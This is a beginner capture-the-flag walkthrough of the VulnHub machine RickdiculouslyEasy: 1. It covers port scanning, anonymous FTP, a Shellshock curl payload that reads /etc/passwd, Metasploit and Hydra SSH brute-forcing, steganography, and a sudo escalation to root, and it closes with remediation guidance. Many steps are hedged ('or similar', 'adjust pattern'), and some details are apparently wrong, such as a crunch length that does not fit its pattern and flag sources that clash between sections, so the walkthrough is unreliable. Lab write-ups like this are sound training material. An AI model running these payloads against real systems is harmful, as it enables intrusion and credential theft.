# RickdiculouslyEasy: 1 — Wubba Lubba Dub Dub, Now Root Me

Oh geez, Morty!! Someone made a whole CTF machine based on Rick and Morty and it's actually legit. This is not a serious machine in terms of difficulty, but it's wild in terms of creativity: 9 flags scattered across FTP banners, web pages, image steganography, SUID binaries, Shellshock CGI, and a port 60000 netcat listener. You collect 130 points total by hunting every flag. It's goofy as hell and teaches something real at every step. Rick would approve.

| Field | Value |
|---|---|
| **Level** | Beginner |
| **Target VM** | RickdiculouslyEasy: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/ |
| **Techniques** | Nmap multi-port scan, FTP anonymous access, web directory brute-force, Shellshock CGI exploitation, SSH brute-force (Metasploit), steganography (steghide), SUID binary analysis, crunch wordlist generation, Hydra SSH brute-force, GTFOBin via sudo su |
| **CVEs** | CVE-2014-6271 (Shellshock: bash environment variable RCE via CGI) |
| **APT Groups** | APT28 (Fancy Bear): used Shellshock extensively in 2014 against government and military targets; OceanLotus (APT32): documented use of steganography for C2 communication and credential exfiltration in Southeast Asian intrusions |

---

## Attack Summary

```
nmap -p- -> ports 21, 22, 80, 9090, 13337, 22222, 60000
  |
  +-- FTP anon port 21 -> FLAG 1 (in FTP banner)
  |
  +-- HTTP port 80:
  |     +-- dirb -> /passwords/ -> FLAG 2 + winter password
  |     +-- /cgi-bin/ -> Shellshock -> enumerate users (Summer/Morty/RickSanchez)
  |     +-- /robots.txt -> disallowed paths
  |
  +-- Metasploit SSH brute (Summer:winter) -> SSH login
  |     +-- find Morty's zip + safe binary
  |     +-- steghide on Meeseek image -> Morty archive password
  |     +-- SUID safe binary -> band name hint -> 131333
  |
  +-- crunch + Hydra -> RickSanchez:WubbaLubbaDubDub (or variant)
  |     +-- sudo su -> root -> FLAG 8 (root.txt)
  |
  +-- nc port 60000 -> FLAG 9
  +-- port 9090 browser -> FLAG 7
```

---

## Methodology

1. Full port scan to discover all open services
2. FTP anonymous access: first flag in the service
3. Web directory brute-force: find /passwords/ directory with flag and credential
4. CGI Shellshock enumeration to find valid usernames
5. Metasploit SSH brute-force with discovered credential (Summer:winter)
6. Steganography on recovered image (meeseeksandescapism.jpg)
7. SUID binary analysis: argument reveals clue for wordlist
8. Crunch wordlist generation and Hydra brute-force for RickSanchez
9. Sudo su to root; collect remaining flags via netcat and web port

---

## Step 1 — Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -p- -A 192.168.1.101
```

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd (flag in banner)
22/tcp    open  ssh     OpenSSH (RickSanchez login later)
80/tcp    open  http    Apache
9090/tcp  open  http    Cockpit web UI (FLAG here)
13337/tcp open  unknown (flag in banner)
22222/tcp open  ssh     OpenSSH (Summer login)
60000/tcp open  unknown (nc FLAG)
```

This box runs multiple non-standard ports. Always use `-p-` (all 65535 ports) on CTF machines. You will miss flags if you only scan top 1000.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — FTP Anonymous and Banner Flags

```bash
ftp 192.168.1.101
# User: anonymous
# Pass: (blank or anonymous)

ftp> ls -la
ftp> get FLAG.txt
ftp> quit
```

The FTP banner itself may contain a flag. Also check the 13337 and 60000 port banners:

```bash
nc 192.168.1.101 13337
# Read the flag from the response

# Port 60000 gives a flag too:
nc 192.168.1.101 60000
```

**FLAG 1:** from FTP anonymous or banner
**FLAG 2:** from port 13337 banner

**MITRE ATT&CK:** T1021.003 — Remote Services: FTP; T1046 — Network Service Discovery

---

## Step 3 — Web Enumeration

```bash
# dirb or gobuster
dirb http://192.168.1.101/ /usr/share/wordlists/dirb/common.txt

# Key discoveries:
# /passwords/  -> contains a FLAG and the word 'winter'
# /cgi-bin/    -> test for Shellshock
# /robots.txt  -> disallowed paths
```

Browse to `/passwords/`:

```bash
curl http://192.168.1.101/passwords/
# FLAG 3 found here
# 'winter' found as a password clue
```

The port 9090 Cockpit UI may show a flag on its login page:

```bash
# Browse http://192.168.1.101:9090/
# FLAG visible in the UI or page source
```

**MITRE ATT&CK:** T1595.003 — Active Scanning: Wordlist Scanning; T1083 — File and Directory Discovery

---

## Step 4 — Shellshock CGI Enumeration

Test for Shellshock on `/cgi-bin/`:

```bash
# Find CGI scripts
dirb http://192.168.1.101/cgi-bin/ /usr/share/wordlists/dirb/common.txt -X .cgi,.sh,.pl

# Test Shellshock manually
curl -H "User-Agent: () { :;}; echo; echo; /bin/cat /etc/passwd" \
  http://192.168.1.101/cgi-bin/tracertool.cgi
```

This leaks `/etc/passwd`, revealing usernames: Summer, Morty, RickSanchez.

**Alternative with Metasploit:**

```bash
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS 192.168.1.101
set TARGETURI /cgi-bin/tracertool.cgi
run
```

**Real-world note:** Shellshock (CVE-2014-6271) allowed unauthenticated RCE on any system with bash CGI handlers. APT28 used it against US government targets within weeks of disclosure. Millions of embedded devices and servers are still unpatched. Always test CGI endpoints on older servers.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Step 5 — SSH Login as Summer

With usernames from /etc/passwd and `winter` from the passwords page:

```bash
# Option 1: direct
ssh Summer@192.168.1.101 -p 22222
# Password: winter

# Option 2: Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.101
set RPORT 22222
set USERNAME Summer
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

After login as Summer, enumerate:

```bash
ls -la /home/
ls -la /home/Morty/
ls -la /home/RickSanchez/
```

Find in Morty's directory: a zip archive and a `journal.txt.zip`. Also find a SUID binary in RickSanchez's directory.

**MITRE ATT&CK:** T1110 — Brute Force; T1078 — Valid Accounts

---

## Step 6 — Steganography on Meeseek Image

A `meeseeksandescapism.jpg` (or similar) image is on the server or in the home directories. Extract hidden data:

```bash
steghide extract -sf meeseeksandescapism.jpg
# Passphrase: (try blank, 'winter', or other found passwords)
# Extracts: Rick_n_Morty_Ticket.txt or similar
```

The extracted content contains the password for Morty's zip archive:

```bash
unzip journal.txt.zip
# Password: from steghide output
cat journal.txt
# FLAG found inside + further clue
```

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1552.001 — Credentials in Files

---

## Step 7 — SUID Binary Analysis

```bash
find / -perm -4000 -type f 2>/dev/null
# Find: /home/RickSanchez/RICKS_SAFE/safe (or similar path)

/home/RickSanchez/RICKS_SAFE/safe 131333
# Output contains: "SuperSafePassword" or a band name clue
# Clue: "The Safe: Morty Jr's band name follows the pattern: <WORD><DIGITS>"
```

The binary, when run with the right argument, reveals a clue about RickSanchez's password pattern: a band name + numbers.

**MITRE ATT&CK:** T1574.006 — Hijack Execution Flow: SUID and SGID; T1083 — File and Directory Discovery

---

## Step 8 — Crunch + Hydra for RickSanchez

Based on the band name clue, generate a targeted wordlist:

```bash
# The password pattern is: FleshCurtains + 5-digit number
# or similar band-name-based pattern

# Generate wordlist with crunch:
crunch 14 14 -t FleshCurtains%%%%% -o /tmp/rick_wordlist.txt
# (adjust pattern based on actual clue)

# Brute-force RickSanchez SSH:
hydra -l RickSanchez -P /tmp/rick_wordlist.txt ssh://192.168.1.101 -s 22
```

On success, SSH in as RickSanchez:

```bash
ssh RickSanchez@192.168.1.101 -p 22
# Password: FleshCurtains<digits>

sudo su
# Enter password
id
# uid=0(root)
cat /root/FLAG.txt
```

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1548.003 — Abuse Elevation Control: Sudo

---

## Captured Flags, Hashes and Credentials

| Flag | Points | Found At | Method |
|---|---|---|---|
| FLAG 1 | 10 | FTP service or banner | Anonymous FTP / nc |
| FLAG 2 | 10 | Port 13337 banner | nc 192.168.1.101 13337 |
| FLAG 3 | 30 | /passwords/ web directory | dirb enumeration |
| FLAG 4 | 20 | /etc/passwd via Shellshock | CVE-2014-6271 CGI |
| FLAG 5 | 20 | Morty's zip journal.txt | steghide + zip extract |
| FLAG 6 | 20 | SUID safe binary output | Binary analysis |
| FLAG 7 | 10 | Port 9090 Cockpit UI | Browser or curl |
| FLAG 8 | 10 | /root/FLAG.txt | sudo su as RickSanchez |
| FLAG 9 | 10 | Port 60000 netcat | nc 192.168.1.101 60000 |
| **Total** | **130** | | |
| Credential | Summer:winter | /passwords/ + Shellshock passwd | SSH port 22222 |
| Credential | RickSanchez:FleshCurtains<N> | SUID binary clue + crunch | SSH port 22 |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Full port scan required: flags on non-standard ports | Enterprise networks commonly run services on non-standard ports (dev tools, monitoring, management UIs) | Always scan all 65535 ports; top-1000 scans miss critical services |
| 2 | FTP anonymous access still common | Thousands of organizations still run anonymous FTP; often expose backups and configs | Disable anonymous FTP; use SFTP with key-based auth |
| 3 | Shellshock (CVE-2014-6271) still unpatched in the wild | Millions of embedded devices, legacy servers, and network appliances remain unpatched 10+ years later | Patch bash; audit CGI handlers; test all CGI endpoints for Shellshock |
| 4 | Steganography used for data hiding | APT32 (OceanLotus) uses steganography for C2 in real intrusions; flag files in images are not just CTF tricks | Inspect image files from unknown sources; use stegdetect/steganalysis tools in forensic investigations |
| 5 | Pattern-based passwords cracked with targeted wordlists | Real-world credential audits find users with passwords matching company name + year + symbol | Generate targeted wordlists using policy knowledge; CUPP and crunch are legitimate audit tools |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Active Scanning: Wordlist Scanning | T1595.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application (Shellshock CGI) | T1190 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information (steganography) | T1027 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | SUID/SGID Execution | T1574.006 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Patch bash for Shellshock** — update bash to 4.3 patch 25+; disable CGI scripts that invoke bash
2. **Disable anonymous FTP** — use SFTP with public-key authentication; never allow anonymous access
3. **Remove flags and sensitive files from web directories** — production systems should never expose password hints at `/passwords/`
4. **Audit SUID binaries** — `find / -perm -u=s -type f 2>/dev/null`; remove SUID from custom or non-essential binaries
5. **Enforce strong password policies** — prevent pattern-based passwords (companyname+year, bandname+digits); use password managers

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all services on all ports; include non-standard ports |
| Protect | Protective Technology | Patch bash; disable CGI; restrict FTP to authenticated users |
| Detect | Anomalies and Events | Alert on Shellshock patterns in HTTP headers; monitor FTP anonymous logins |
| Respond | Response Planning | Disable CGI endpoints; disable anonymous FTP; rotate credentials |
| Recover | Recovery Planning | Rebuild from clean image; audit all user credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| CM-6 | Configuration Settings | Disable CGI bash handlers; disable anonymous FTP |
| CM-7 | Least Functionality | Remove SUID from non-essential binaries |
| IA-5 | Authenticator Management | Enforce complex password policies; no pattern-based passwords |
| SI-2 | Flaw Remediation | Patch Shellshock (CVE-2014-6271) immediately |
| SC-8 | Transmission Confidentiality | Replace FTP with SFTP; use SSH key authentication |

### CISA KEV

CVE-2014-6271 (Shellshock) is in the CISA Known Exploited Vulnerabilities catalog. Organizations are directed to remediate it immediately. Shellshock continues to appear in penetration test findings against legacy systems and embedded devices.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL3 (Shellshock patched; scan for bash version) |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Assets | MIL2 (full port inventory; non-standard port documentation) |
| Identity and Access Management (IAM) | Manage Credentials | MIL2 (disable anonymous FTP; enforce password complexity) |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening: disable CGI bash handlers; disable anonymous FTP
- **D3-UA** — User Account Management: disable anonymous service accounts
- **D3-OAM** — OS Administrative Management: remove SUID from custom binaries; audit sudoers

---

## Final Thoughts

RickdiculouslyEasy: 1 is exactly what a beginner CTF should be: goofy, fun, and actually educational. You practice FTP enumeration, web brute-force, Shellshock exploitation, steganography, SUID analysis, wordlist generation, and Hydra brute-force all in one box. The Rick and Morty theme keeps it entertaining through the grind.

If you can collect all 9 flags, you have a solid baseline for beginner-to-intermediate skills. The machine does not require deep exploitation knowledge, but it does require thorough enumeration. That's the lesson: when you don't know what to do, enumerate harder.

*Wubba Lubba Dub Dub!!!*

Thanks guys!! (❍ᴥ❍ʋ)
